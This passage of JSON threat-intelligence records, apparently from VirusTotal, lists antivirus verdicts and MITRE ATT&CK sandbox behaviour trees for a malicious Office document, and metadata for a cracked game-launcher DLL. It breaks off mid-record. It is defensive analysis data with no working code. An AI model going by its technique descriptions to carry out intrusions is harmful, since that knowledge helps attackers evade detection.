          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.OLE2.UrtBadur.genw",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231228-02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1703766653",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Downloader/DOC.Agent",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231224"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231108"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        }
      },
      "sigma_analysis_stats": {
        "high": 0,
        "medium": 1,
        "critical": 0,
        "low": 2
      }
    },
    "type": "file",
    "id": "1e931660cce69add24e405c9fbdd3072190c9f716c1675334f00d0bdbf84bf46",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/1e931660cce69add24e405c9fbdd3072190c9f716c1675334f00d0bdbf84bf46"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Document contains embedded VBA macros"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\nSeveral types exist:\nBrowser-based Exploitation\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\nOffice Applications\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\nCommon Third-party Applications\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Potential document exploit detected (performs DNS queries)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Potential document exploit detected (performs HTTP gets)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Potential document exploit detected (unknown TCP traffic)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1203/",
                "id": "T1203",
                "name": "Exploitation for Client Execution"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries the product ID of Microsoft Office"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks if Microsoft Office is installed"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads ini files"
                  },
                  {
                    "severity": "INFO",
                    "description": "Writes ini files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.\nAdversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads the hosts file"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1018/",
                "id": "T1018",
                "name": "Remote System Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Monitors certain registry keys / values for changes (often done to protect autostart functionality)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  },
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS for network communication, use the SSL MITM Proxy cookbook for further analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1573/",
                "id": "T1573",
                "name": "Encrypted Channel"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Document contains embedded VBA macros"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the user directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "DOCGuard": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "User Execution: Malicious File"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1204/002/",
                "id": "T1204.002",
                "name": "Malicious File"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/1e931660cce69add24e405c9fbdd3072190c9f716c1675334f00d0bdbf84bf46/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65987a37b6b770eea85855b8"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 DLL",
      "tlsh": "T165154AB7E1830C52CE464DB689B3BD71526F2C32BE7D578A12003A157BB33D25726AD2",
      "vhash": "195086655d15555757755088z61hz19z67z80",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "pedll"
      ],
      "creation_date": 1416863879,
      "names": [
        "uplay_r164.dll",
        "uplay*",
        "UPLAY_R164.DLL",
        "36887.bin",
        "uplay_r164.DLL"
      ],
      "signature_info": {
        "product": "UPlay",
        "internal name": "uplay*",
        "copyright": "*!ReLOADeD!*",
        "original name": "uplay*",
        "file version": "2,2,0,0",
        "description": "UPlay"
      },
      "last_modification_date": 1704190874,
      "type_tag": "pedll",
      "times_submitted": 375,
      "total_votes": {
        "harmless": 2,
        "malicious": 0
      },
      "size": 901124,
      "popular_threat_classification": {
        "suggested_threat_label": "hacktool.crack/gamehack",
        "popular_threat_category": [
          {
            "count": 9,
            "value": "hacktool"
          },
          {
            "count": 7,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 7,
            "value": "crack"
          },
          {
            "count": 5,
            "value": "gamehack"
          },
          {
            "count": 2,
            "value": "usblks23"
          }
        ]
      },
      "authentihash": "ffcc81dab09a7d4ff959c2c9e3069196f3f26a4bc2a7ef95a67e343898a4877e",
      "detectiteasy": {
        "filetype": "PE64",
        "values": [
          {
            "version": "2.XX-3.XX",
            "type": "Protector",
            "name": "VMProtect"
          },
          {
            "version": "2013",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "info": "C++",
            "version": "18.00.30723",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "12.00.30723",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "2013",
            "type": "Tool",
            "name": "Visual Studio"
          }
        ]
      },
      "last_submission_date": 1704190874,
      "meaningful_name": "uplay*",
      "trid": [
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 44.4
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 21.3
        },
        {
          "file_type": "Windows Icons Library (generic)",
          "probability": 8.7
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 8.5
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 8.4
        }
      ],
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "harmless",
          "confidence": 3,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "CLEAN"
          ]
        },
        "DAS-Security Orcas": {
          "category": "harmless",
          "sandbox_name": "DAS-Security Orcas",
          "malware_classification": [
            "CLEAN"
          ]
        }
      },
      "sha256": "1a1c5cfc2a24ba5eaa67035d1ca2b5d954597de7dda0154eaef8f66d537672b0",
      "type_extension": "dll",
      "tags": [
        "assembly",
        "overlay",
        "detect-debug-environment",
        "idle",
        "long-sleeps",
        "64bits",
        "pedll"
      ],
      "last_analysis_date": 1701476497,
      "unique_sources": 285,
      "first_submission_date": 1426034186,
      "sha1": "8f2a520bebc21f38a5488b828f141061de5f7a2c",
      "ssdeep": "12288:jfWW9MVx/EEEvccsAAS3rkN55ib1dSfFy4Bdv2FhZrdkn4wzDWimi:jfWWgGUcsAAS3rPdK9v2FhZdsLzDWimi",
      "md5": "50947fe39cffb3b03f5109e26fae1aa8",
      "pe_info": {
        "exports": [
          "??0OrbitClient@orbitclient@mg@@QEAA@XZ",
          "??0SavegameInfo@orbitclient@mg@@AEAA@XZ",
          "??0SavegameReader@orbitclient@mg@@AEAA@XZ",
          "??0SavegameWriter@orbitclient@mg@@AEAA@XZ",
          "??1OrbitClient@orbitclient@mg@@QEAA@XZ",
          "??1SavegameInfo@orbitclient@mg@@AEAA@XZ",
          "??1SavegameReader@orbitclient@mg@@AEAA@XZ",
          "??1SavegameWriter@orbitclient@mg@@AEAA@XZ",
          "?CheckUpdate@OrbitClient@orbitclient@mg@@QEAAHXZ",
          "?Close@SavegameReader@orbitclient@mg@@QEAAXXZ",
          "?Close@SavegameWriter@orbitclient@mg@@QEAAX_N@Z",
          "?GetInstallationErrorNum@OrbitClient@orbitclient@mg@@QEAAIXZ",
          "?GetInstallationErrorString@OrbitClient@orbitclient@mg@@QEAAPEAGPEBD@Z",
          "?GetLocText@OrbitClient@orbitclient@mg@@QEAAPEBGPEBGPEBD@Z",
          "?GetLoginDetails@OrbitClient@orbitclient@mg@@QEAAXIPEAVIGetLoginDetailsListener@23@@Z",
          "?GetName@SavegameInfo@orbitclient@mg@@QEAAPEBGXZ",
          "?GetNetworkTraffic@OrbitClient@orbitclient@mg@@QEAAXIPEAVIGetNetworkTrafficListener@23@@Z",
          "?GetOrbitServer@OrbitClient@orbitclient@mg@@QEAAXIPEAVIGetOrbitServerListener@23@II@Z",
          "?GetProductId@SavegameInfo@orbitclient@mg@@QEAAIXZ",
          "?GetRequestUniqueId@OrbitClient@orbitclient@mg@@QEAAIXZ",
          "?GetSavegameId@SavegameInfo@orbitclient@mg@@QEAAIXZ",
          "?GetSavegameList@OrbitClient@orbitclient@mg@@QEAAXIPEAVIGetSavegameListListener@23@I@Z",
          "?GetSavegameReader@OrbitClient@orbitclient@mg@@QEAAXIPEAVIGetSavegameReaderListener@23@II@Z",
          "?GetSavegameWriter@OrbitClient@orbitclient@mg@@QEAAXIPEAVIGetSavegameWriterListener@23@II_N@Z",
          "?GetSize@SavegameInfo@orbitclient@mg@@QEAAIXZ",
          "?Read@SavegameReader@orbitclient@mg@@QEAAXIPEAVISavegameReadListener@23@IPEAXI@Z",
          "?RemoveSavegame@OrbitClient@orbitclient@mg@@QEAAXIPEAVIRemoveSavegameListener@23@II@Z",
          "?SetName@SavegameWriter@orbitclient@mg@@QEAA_NPEAG@Z",
          "?StartLauncher@OrbitClient@orbitclient@mg@@QEAA_NIIPEBD0@Z",
          "?StartProcess@OrbitClient@orbitclient@mg@@QEAAXPEAG00@Z",
          "?UPLAY_WIN_ActionTaken@@YAHPEAUUPLAY_WIN_Action_t@@PEAUUPLAY_Overlapped_t@@@Z",
          "?Update@OrbitClient@orbitclient@mg@@QEAAXXZ",
          "?Write@SavegameWriter@orbitclient@mg@@QEAAXIPEAVISavegameWriteListener@23@PEAXI@Z",
          "SuperSecretAPIWithTagDontCopyThisOne",
          "UPLAY_ACH_EarnAchievement",
          "UPLAY_ACH_GetAchievementImage",
          "UPLAY_ACH_GetAchievements",
          "UPLAY_ACH_Write",
          "UPLAY_AVATAR_Get",
          "UPLAY_AVATAR_GetAvatarIdForCurrentUser",
          "UPLAY_AVATAR_GetBitmap",
          "UPLAY_ClearGameSession",
          "UPLAY_FRIENDS_AddToBlackList",
          "UPLAY_FRIENDS_DisableFriendMenuItem",
          "UPLAY_FRIENDS_EnableFriendMenuItem",
          "UPLAY_FRIENDS_GetFriendList",
          "UPLAY_FRIENDS_Init",
          "UPLAY_FRIENDS_InviteToGame",
          "UPLAY_FRIENDS_IsBlackListed",
          "UPLAY_FRIENDS_IsFriend",
          "UPLAY_FRIENDS_RequestFriendship",
          "UPLAY_FRIENDS_ShowFriendSelectionUI",
          "UPLAY_GetInstallationError",
          "UPLAY_GetLastError",
          "UPLAY_GetNextEvent",
          "UPLAY_GetOverlappedOperationResult",
          "UPLAY_HasOverlappedOperationCompleted",
          "UPLAY_INSTALLER_AreChunksInstalled",
          "UPLAY_INSTALLER_GetChunkIdsFromTag",
          "UPLAY_INSTALLER_GetLanguageUtf8",
          "UPLAY_INSTALLER_Init",
          "UPLAY_INSTALLER_ReleaseChunkIdList",
          "UPLAY_INSTALLER_UpdateInstallOrder",
          "UPLAY_Init",
          "UPLAY_METADATA_ClearContinuousTag",
          "UPLAY_METADATA_SetContinuousTag",
          "UPLAY_METADATA_SetSingleEventTag",
          "UPLAY_OVERLAY_SetShopUrl",
          "UPLAY_OVERLAY_Show",
          "UPLAY_OVERLAY_ShowFacebookAuthentication",
          "UPLAY_OVERLAY_ShowShopUrl",
          "UPLAY_PARTY_DisablePartyMemberMenuItem",
          "UPLAY_PARTY_EnablePartyMemberMenuItem",
          "UPLAY_PARTY_GetFullMemberList",
          "UPLAY_PARTY_GetId",
          "UPLAY_PARTY_GetInGameMemberList",
          "UPLAY_PARTY_Init",
          "UPLAY_PARTY_InvitePartyToGame",
          "UPLAY_PARTY_InviteToParty",
          "UPLAY_PARTY_IsInParty",
          "UPLAY_PARTY_IsPartyLeader",
          "UPLAY_PARTY_PromoteToLeader",
          "UPLAY_PARTY_RespondToGameInvite",
          "UPLAY_PARTY_SetGuest",
          "UPLAY_PARTY_SetUserData",
          "UPLAY_PARTY_ShowGameInviteOverlayUI",
          "UPLAY_PRESENCE_SetRichPresenceLine",
          "UPLAY_PRESENCE_SetRichPresencePropertyInt32",
          "UPLAY_PRESENCE_SetRichPresencePropertyString",
          "UPLAY_PeekNextEvent",
          "UPLAY_Quit",
          "UPLAY_Release",
          "UPLAY_SAVE_Close",
          "UPLAY_SAVE_GetSavegames",
          "UPLAY_SAVE_Open",
          "UPLAY_SAVE_Read",
          "UPLAY_SAVE_Remove",
          "UPLAY_SAVE_SetName",
